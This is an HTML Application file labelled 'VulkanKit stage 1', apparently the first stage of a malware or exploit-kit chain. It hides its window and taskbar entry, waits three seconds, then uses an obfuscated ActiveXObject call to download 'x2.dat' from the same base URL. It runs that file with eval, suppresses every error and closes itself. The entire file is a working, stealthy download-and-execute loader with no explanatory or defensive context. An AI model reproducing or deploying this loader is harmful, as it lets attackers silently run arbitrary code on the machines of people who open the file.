<!-- VulkanKit stage 1. Pure ASCII, address-independent: the stage-2 URL
     comes from document.URL, so only x2.dat follows the BaseUrl. -->
<html><head><title>VulkanKit</title>
<hta:application id="app" windowstate="minimize" showintaskbar="no" />
<script language="JScript">
function go() {
    try {
        var d = document.URL.replace(/[^\/]*$/, "");
        var ax = "Act" + "iveXObject";
        var x = new window[ax]("MSXML2.XMLHTTP");
        x.open("GET", d + "x2.dat", false);
        x.send();
        if (x.status == 200) { eval(x.responseText); }
    } catch (e) {}
    window.close();
}
setTimeout(go, 3000);
</script></head><body></body></html>
